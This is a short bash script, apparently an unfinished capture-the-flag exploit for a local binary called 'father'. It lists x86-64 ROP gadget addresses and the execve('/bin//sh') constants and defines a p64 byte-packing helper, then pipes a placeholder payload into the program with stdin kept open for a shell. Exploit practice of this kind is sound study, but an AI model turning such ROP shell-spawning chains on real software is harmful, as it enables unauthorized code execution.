#!/bin/bash

if [[ -e payload_3_1 ]]; then
    rm payload_3_1
fi
if [[ -e payload_3_2 ]]; then
    rm payload_3_2
fi
if [[ -e payload_3_3 ]]; then
    rm payload_3_3
fi


: << ROPGadgets
0x0000000000451064: push rsp; ret;
0x000000000042d6ce: push rdi; ret;
0x00000000004c2926: push rsi; ret;
0x00000000004d1ace: push rbp; ret;
0x000000000044b78f: push rbx; ret;

0x00000000004005cf: pop rax; ret;
0x0000000000400ad8: pop rbp; ret;
0x0000000000400f48: pop rbx; ret;
0x00000000004006c6: pop rdi; ret;
0x000000000044c2a6: pop rdx; ret;
0x0000000000410893: pop rsi; ret;
0x0000000000401f13: pop rsp; ret;

0x0000000000422113: cdq; ret;

0x00000000004013ec: syscall;
ROPGadgets

: << Values
0x68732f2f6e69622f: "/bin//sh"
0x0000000000000000: 0
0x000000000000003b: 59
Values


p64() {
    # Remove the '0x' prefix if present
    local hex=${1#0x}
    # Pad the hex string to ensure it's 16 characters, 8 bytes long
    while [ ${#hex} -lt 16 ]; do
        hex="0$hex"
    done
    # Reverse the bytes and format as a little-endian string
    local le=""
    for (( i=0; i<${#hex}; i+=2 )); do
        le="\\x${hex:$i:2}$le"
    done
    # Echo the result
    echo -ne "$le"
}


v18="1"

echo -ne $v18 > payload_3_1

(cat payload_3_1; cat - ) | ./father






